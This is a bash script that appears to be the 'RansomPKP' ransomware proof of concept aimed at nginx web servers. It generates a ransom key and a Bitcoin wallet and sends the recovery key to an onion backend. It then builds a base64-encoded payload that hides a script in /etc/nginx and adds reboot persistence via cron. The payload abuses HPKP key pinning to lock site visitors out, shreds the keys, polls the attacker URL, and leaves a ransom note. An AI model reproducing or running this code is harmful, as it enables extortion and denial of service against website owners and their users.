#!/bin/bash

backendAddress="${1}"
if [ -z "${backendAddress}" ] ; then
	echo -n 'Backend onion address: '
	read backendAddress
fi
backendAddress="$(echo "${backendAddress}" | grep -oP '[A-Za-z0-9]{16}')"

ransomAmount="${2}"
if [ -z "${ransomAmount}" ] ; then
	echo -n 'Ransom amount (BTC): '
	read ransomAmount
fi
ransomAmount="$(echo "${ransomAmount}" | sed 's| BTC||g')"

targetCsrSubject="${3}"
if [ -z "${targetCsrSubject}" ] ; then
	echo -n 'Target CSR subject: '
	read targetCsrSubject
fi

target="$(echo "${targetCsrSubject}" | sed 's/.*CN=//g' | sed 's/\/.*//g')"
targetDir="ransompkp-${target}"

if [ -d $targetDir ] ; then
	echo "Key generation directory ${targetDir} already exists."
	exit 1
fi

mkdir $targetDir
cd $targetDir

backendURL="https://${backendAddress}.onion.to/${target}"

echo "${backendAddress}" > backend.address
echo "${ransomAmount}" > ransom.amount
echo "${targetCsrSubject}" > csr.subject

openssl genrsa -out ransom.pem 2048 2> /dev/null
openssl rsa -in ransom.pem -outform der -pubout 2> /dev/null | openssl dgst -sha256 -binary | openssl enc -base64 > ransom.hash
openssl enc -aes-256-cbc -k "$(echo "$(dd if=/dev/urandom bs=1 count=1024 2> /dev/null)" | hexdump | grep -oP ' .. ' | perl -pe 's/\s+//g')" -nosalt -p < /dev/null 2> /dev/null | head -n2 | perl -pe 's/.*=//g' > recovery.key
openssl aes-256-cbc -e -a -salt -in ransom.pem -out ransom.pem.enc -K $(head -n1 recovery.key) -iv $(tail -n1 recovery.key)
openssl aes-256-cbc -d -a -in ransom.pem.enc -out ransom.pem.dec -K $(head -n1 recovery.key) -iv $(tail -n1 recovery.key)

if [ "$(diff ransom.pem ransom.pem.dec)" ] ; then
	echo 'Key generation failed.'
	exit 2
fi

rm ransom.pem.dec

# OS X bitcoind install instructions: brew install autoconf automake berkeley-db4 libtool boost miniupnpc openssl pkg-config protobuf qt5 libevent ; git clone https://github.com/bitcoin/bitcoin.git ; cd bitcoin ; ./autogen.sh ; ./configure --without-gui ; make ; sudo make install

if [ -z "$(ps aux | grep bitcoind | grep -v grep)" ] ; then
	(bitcoind > /dev/null 2>&1 &)
	killBitcoind=true
	while ! bitcoin-cli getnewaddress > /dev/null 2>&1 ; do sleep 1 ; done
fi

bitcoin-cli getnewaddress > wallet.address
bitcoin-cli dumpprivkey $(cat wallet.address) > wallet.key

walletLabel="$(date +%s)"
bitcoin-cli importprivkey $(cat wallet.key) $walletLabel
walletAddress="$(bitcoin-cli getaddressesbyaccount $walletLabel | tr '\n' ' ' | perl -pe 's/.*"(.*?)".*/\1/g')"

if [ "${killBitcoind}" ] ; then
	killall bitcoind
fi

if [ "${walletAddress}" != "$(cat wallet.address)" ] ; then
	echo 'Bitcoin wallet generation failed.'
	exit 3
fi

# OS X nodejs install instructions: brew install nodejs 

curl -X POST "${backendURL}" -H 'Content-Type: application/json' -d "$(
	node -e '
		var fs = require("fs");
		console.log(JSON.stringify({
			ransomAmount: fs.readFileSync("ransom.amount").toString(),
			recoveryKey: fs.readFileSync("recovery.key").toString(),
			walletAddress: fs.readFileSync("wallet.address").toString()
		}));
	'
)"
echo


cat > pwn.full.sh << EndOfMessage
#!/bin/bash

paymentAddress='${walletAddress}'
paymentAmount='${ransomAmount}'

umask 077
cat > /etc/nginx/.conf.sh <<- EOM
	#!/bin/bash

	csrSubject='${targetCsrSubject}'
	ransomKeyHash='$(cat ransom.hash)'
	ransomKeyEncrypted='$(cat ransom.pem.enc | base64)'
	recoveryURL='${backendURL}'


	read -r -d '' plaintextconf <<- EOM
		server {
			listen 80;
			server_name SERVER_NAME;
			return 301 https://START SERVER_NAME END\\\$request_uri;
		}
		server {
			SSL_CONFIG
			
	EOM

	read -r -d '' sslconf <<- EOM
		listen 443 ssl;

		ssl_certificate ssl/cert.pem;
		ssl_certificate_key ssl/key.pem;
		ssl_dhparam ssl/dhparams.pem;

		ssl_session_timeout 1d;
		ssl_session_cache shared:SSL:50m;

		ssl_prefer_server_ciphers on;
		add_header Public-Key-Pins 'max-age=31536000; includeSubdomains; pin-sha256="KEY_HASH"; pin-sha256="BACKUP_HASH"';
		add_header Strict-Transport-Security 'max-age=31536000; includeSubdomains; preload';
		ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
		ssl_ciphers 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK';

		ssl_stapling on;
		ssl_stapling_verify on;
	EOM

	function delete {
		if [ -f "\\\${1}" ] ; then
			for i in {1..10} ; do
				dd if=/dev/urandom of="\\\${1}" bs=1024 count="\\\$(du -k "\\\${1}" | cut -f1)"
			done

			rm "\\\${1}"
		fi
	}

	function dottify {
		echo "\\\${1}" | perl -pe 's/(.*\/)/\1./g'
	}

	function getconfigfiles {
		grep -rlP 'listen (80|443)[^0-9]' /etc/nginx | \
			grep -v .conf.sh | \
			grep -v certbot | \
			grep -v '.bak' | \
			grep -v '.new' | \
			grep -v '/\.'
	}

	function updatecert {
		killall nginx
		service nginx stop

		/etc/nginx/.certbot certonly \
			-n \
			--agree-tos \
			--expand \
			--standalone \
			--csr /etc/nginx/ssl/tmp/csr.pem \
			--cert-path /etc/nginx/ssl/tmp/cert.pem \
			\\\$*

		delete /etc/nginx/ssl/tmp/csr.pem
		delete /etc/nginx/ssl/cert.pem
		delete /etc/nginx/ssl/key.pem
		delete /etc/nginx/ssl/dhparams.pem

		mv /etc/nginx/ssl/tmp/cert.pem /etc/nginx/ssl/
		mv /etc/nginx/ssl/tmp/key.pem /etc/nginx/ssl/
		mv /etc/nginx/ssl/tmp/dhparams.pem /etc/nginx/ssl/

		keyHash="\\\$(openssl rsa -in /etc/nginx/ssl/key.pem -outform der -pubout | openssl dgst -sha256 -binary | openssl enc -base64)"
		backupHash="\\\${ransomKeyHash}"

		if [ "\\\${keyHash}" == "\\\${backupHash}" ] ; then
			openssl genrsa -out /etc/nginx/ssl/backup.pem 2048
			backupHash="\\\$(openssl rsa -in /etc/nginx/ssl/backup.pem -outform der -pubout | openssl dgst -sha256 -binary | openssl enc -base64)"
		fi

		for f in \\\$(getconfigfiles) ; do
			mv "\\\${f}" "\\\${f}.bak"
			cat "\\\${f}.bak" | grep -vP '^(\s+)?#' > "\\\${f}.new"

			if ( ! grep 'listen 443' "\\\${f}.new" ) ; then
				cat "\\\${f}.new" | \
					grep -v 'listen ' | \
					perl -pe 's/\n/☁/g' | \
					perl -pe "s/server \{(.*?server_name (.*?)[;☁])/\\\$( \
						echo "\\\${plaintextconf}\1" | \
						perl -pe 's/\//\\\\\\\\\//g' | \
						perl -pe 's/\n/\\\\\n/g' | \
						sed 's|SERVER_NAME|\\\\\2|g' \
					)/g" | \
					perl -pe 's/START (.*?)[ ;☁].*END/\1/g' | \
					perl -pe 's/☁/\n/g' \
				> "\\\${f}.new.new"
				mv "\\\${f}.new.new" "\\\${f}.new"
			fi

			cat "\\\${f}.new" | \
				sed 's/listen 443.*/SSL_CONFIG/g' | \
				grep -v ssl | \
				grep -v Public-Key-Pins | \
				grep -v Strict-Transport-Security | \
				sed "s/SSL_CONFIG/\\\$( \
					echo "\\\${sslconf}" | \
					perl -pe 's/\//\\\\\\\\\//g' | \
					perl -pe 's/\n/\\\\\n/g' \
				)/g" | \
				sed "s|KEY_HASH|\\\${keyHash}|g" | \
				sed "s|BACKUP_HASH|\\\${backupHash}|g" \
			> "\\\${f}"

			rm "\\\${f}.new"
		done

		service nginx start
		service nginx restart

		sleep 30
		for f in \\\$(getconfigfiles) ; do
			mv "\\\${f}" "\\\$(dottify "\\\${f}")"
			mv "\\\${f}.bak" "\\\${f}"
		done
	}


	if [ ! -f /etc/nginx/.certbot ] ; then
		wget https://dl.eff.org/certbot-auto -O /etc/nginx/.certbot
		chmod +x /etc/nginx/.certbot
		/etc/nginx/.certbot certonly -n --agree-tos
	fi


	recoveryKey="\\\$(curl -s \\\${recoveryURL} | perl -pe 's/^\s+$//g')"

	if [ ! -z "\\\${recoveryKey// }" ] ; then
		# Recovery process, triggered after ransom is paid

		cd /etc/nginx

		if ( grep 'tmpfs /etc/nginx/ssl' /etc/fstab ) ; then
			cat /etc/fstab | grep -v 'tmpfs /etc/nginx/ssl' > fstab.tmp
			mv fstab.tmp /etc/fstab
			mount --all
		fi
		rm -rf ssl
		mkdir -p ssl/tmp
		chmod -R 600 ssl
		cd ssl/tmp

		echo "\\\${ransomKeyEncrypted}" | base64 --decode | openssl aes-256-cbc -d -a -out key.pem -K \\\$(echo "\\\${recoveryKey}" | head -n1) -iv \\\$(echo "\\\${recoveryKey}" | tail -n1)

		openssl dhparam -out dhparams.pem 2048
		openssl req -new -out csr.pem -key key.pem -subj "\\\${csrSubject}"
		updatecert --email admin@$target

		for f in \\\$(getconfigfiles) ; do
			echo '# This is a backup of your original config file. The current active configuration has been' > "\\\${f}.bak"
			echo '# automatically modified from this one to include a hardened TLS setup with HSTS and HPKP.' >> "\\\${f}.bak"
			echo -e "# You're welcome.\n\n\n" >> "\\\${f}.bak"
			cat "\\\${f}" >> "\\\${f}.bak"
			mv "\\\$(dottify "\\\${f}")" "\\\${f}"
		done

		echo "It's been a pleasure doing business with you." > /etc/nginx/README-RECOVERY

		crontab -l | grep -v /etc/nginx/.conf.sh > cron.tmp
		crontab cron.tmp
		rm cron.tmp

		rm -rf /etc/nginx/.conf.sh /etc/nginx/ssl/tmp
	else
		# Continue DoSing users via key rotation

		mkdir -p /etc/nginx/ssl/tmp
		cd /etc/nginx/ssl/tmp

		openssl dhparam -out dhparams.pem 2048
		openssl req -new -newkey rsa:2048 -nodes -out csr.pem -keyout key.pem -subj "\\\${csrSubject}"
		updatecert --register-unsafely-without-email

		sleep 129600 # Just infrequent enough to stay within Let's Encrypt's rate limit
		/etc/nginx/.conf.sh &
	fi
EOM
chmod 700 /etc/nginx/.conf.sh


rm -rf /etc/nginx/ssl
tmpdir="/dev/shm/tmp.\$(date +%s)"
if [ -d /dev/shm ] ; then
	mkdir "\${tmpdir}"
	if [ -d "\${tmpdir}" ] ; then
		ln -s "\${tmpdir}" /etc/nginx/ssl
	fi
	mkdir /etc/nginx/ssl 2> /dev/null
else
	mkdir /etc/nginx/ssl
	echo 'tmpfs /etc/nginx/ssl tmpfs rw,size=50M 0 0' >> /etc/fstab
	mount --all
fi
chmod 600 "\${tmpdir}" /etc/nginx/ssl

crontab -l > /etc/nginx/cron.tmp
echo '@reboot /etc/nginx/.conf.sh' >> /etc/nginx/cron.tmp
crontab /etc/nginx/cron.tmp
rm /etc/nginx/cron.tmp

cat > /etc/nginx/README-RANSOM <<- EOM
	All of your website's users have been DoS'd via RansomPKP (look it up),
	and your children have been captured.

	If you would like to have your site resume normal functioning and your
	children safely returned, transfer \${paymentAmount} BTC to the following
	Bitcoin address: \${paymentAddress}.

	(After the transaction is confirmed, full recovery may take up to 36 hours.)

	Best Regards,
	Donald Trump
EOM

# TODO: Get administrator's identity from domain whois info and submit kidnapping request to TaskRabbit API

nohup /etc/nginx/.conf.sh > /dev/null 2>&1 &

EndOfMessage


echo "HISTFILE= ; echo '$(base64 pwn.full.sh)' | base64 --decode > tmp.sh ; bash tmp.sh ; rm tmp.sh" > pwn.sh
